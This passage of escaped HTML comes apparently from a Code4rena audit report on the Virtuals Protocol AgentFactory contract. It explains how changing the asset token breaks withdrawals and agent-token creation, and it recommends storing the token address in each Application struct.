href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L179\"\u003e\u003ccode\u003eAgentFactory::withdraw\u003c/code\u003e\u003c/a\u003e function would fail as the new \u003ccode\u003eassetToken\u003c/code\u003e will be different from the funds held by the contract during \u003ccode\u003eproposeAgent\u003c/code\u003e call.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_applications\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehasRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWITHDRAW_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not proposer\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplicationStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Application is not active\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalEndBlock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Application is not matured yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eApplicationStatus\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eWithdrawn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eapplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ewithdrawableAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);      \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Would break due to different assetToken than upon proposal\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentFactory.sol#L196\"\u003e\u003ccode\u003eAgentFactory::executeApplication\u003c/code\u003e\u003c/a\u003e would fail as there might be no new \u003ccode\u003eassetToken\u003c/code\u003e available inside the contract:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// C2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eliquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Would revert\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddInitialLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eThere is no way available to recover old \u003ccode\u003eassetToken\u003c/code\u003e balance as the contract lacks a \u003ccode\u003erecoverERC20\u003c/code\u003e kind of function.\u003c/li\u003e\n\u003cli\u003eIf there were a case where \u003ccode\u003eassetToken\u003c/code\u003e were available inside the contract, the \u003ccode\u003e_createNewAgentToken\u003c/code\u003e would use unintended \u003ccode\u003eassetToken\u003c/code\u003e than what it was actually proposed to:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"115\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eClones\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclone\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenAdmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_uniswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],          \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Initialising agent token\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenSupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenTaxParams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eallTradingTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis cannot be mitigated with current implementation as Base has a private mempool, the protocol in no capacity can guarantee that before \u003ccode\u003esetAssetToken\u003c/code\u003e all tokens are withdrawn by the \u003ccode\u003eWITHDRAW_ROLE\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAlso, these issues are commonly found inside the \u003ccode\u003eAgentFactoryV3\u003c/code\u003e and \u003ccode\u003eAgentFactoryV4\u003c/code\u003e contracts.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIt is recommended that instead of using a public variable of \u003ccode\u003eassetToken\u003c/code\u003e in function calls other than \u003ccode\u003eproposeAgent\u003c/code\u003e, add the asset token’s address directly inside the \u003ccode\u003eApplication\u003c/code\u003e struct and fetch it, as these calls anyways use the \u003ccode\u003eApplication\u003c/code\u003e struct’s mapping:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"116\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    struct Application {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string name;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string symbol;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string tokenURI;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+        address tokenAddress;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ApplicationStatus status;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 withdrawableAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address proposer;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint8[] cores;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 proposalEndBlock;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 virtualId;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bytes32 tbaSalt;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address tbaImplementation;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint32 daoVotingPeriod;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 daoThreshold;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eUpdated \u003ccode\u003ewithdraw\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"117\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function withdraw(uint256 id) public noReentrant {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        Application storage application = _applications[id];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(msg.sender == application.proposer || hasRole(WITHDRAW_ROLE, msg.sender), \u0026quot;Not proposer\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(application.status == ApplicationStatus.Active, \u0026quot;Application is not active\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(block.number \u0026gt; application.proposalEndBlock, \u0026quot;Application is not matured yet\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 